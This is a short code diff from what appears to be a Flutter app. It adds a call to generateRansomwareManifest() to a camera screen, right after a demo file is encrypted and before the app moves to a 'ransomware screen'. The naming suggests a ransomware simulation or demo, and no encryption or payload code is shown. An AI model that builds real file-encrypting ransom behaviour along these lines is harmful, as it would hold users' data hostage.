@@ -169,6 +169,7 @@ class _CameraScreenState extends State<CameraScreen> {
     }
     // Encrypt the file
     await DemoFileService.encryptDemoFile();
+    await DemoFileService.generateRansomwareManifest();
     // Now show the ransomware screen
     Navigator.push(
       context,
